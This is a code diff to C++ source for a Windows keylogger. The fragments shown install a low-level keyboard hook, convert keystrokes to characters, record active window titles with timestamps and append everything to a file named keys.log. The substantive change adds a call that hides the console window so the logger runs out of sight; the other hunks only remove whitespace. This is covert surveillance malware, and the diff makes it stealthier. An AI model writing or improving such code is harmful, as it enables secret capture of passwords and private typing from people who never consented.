@@ -1,7 +1,7 @@
 #include "keylog.h"
 
 constexpr bool VISIBLE = false;
-constexpr int MAX_BUF = 256; 
+constexpr int MAX_BUF = 256;
 HHOOK _hook;
 KBDLLHOOKSTRUCT kb_data;
 ofstream out_file;
@@ -68,7 +68,7 @@ string resolve_keystroke(int kb_code, HKL keyboard_layout) {
         bool is_lowercase = ((GetKeyState(VK_CAPITAL) & 0x0001) != 0); // check if caps locked
         if ((GetKeyState(VK_SHIFT) & 0x1000) != 0 || (GetKeyState(VK_LSHIFT) & 0x1000) != 0 || (GetKeyState(VK_RSHIFT) & 0x1000) != 0)
             is_lowercase = !is_lowercase;
-        
+
         key = MapVirtualKeyExA(kb_code, MAPVK_VK_TO_CHAR, keyboard_layout);
 
         if (!is_lowercase)
@@ -100,7 +100,7 @@ int save_keystroke(int kb_code) {
         char current_window[MAX_BUF] = "";
         GetWindowTextA(top_window, (LPSTR)current_window, MAX_BUF);
 
-        if (strcmp(last_window, current_window) != 0) { 
+        if (strcmp(last_window, current_window) != 0) {
             strcpy_s(last_window, sizeof(last_window), current_window);
 
             time_t curr_time = time(NULL);
@@ -120,12 +120,14 @@ int save_keystroke(int kb_code) {
 
     cout << output.str();
 
-    return 0; 
+    return 0;
 }
 
 int main() {
     const char* filename = "keys.log";
     out_file.open(filename, ios_base::app);
+
+    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), VISIBLE);
 
     if (!(_hook = SetWindowsHookExA(WH_KEYBOARD_LL, kb_callback, NULL, 0))) {
         cerr << "Setting hook failed!" << endl;
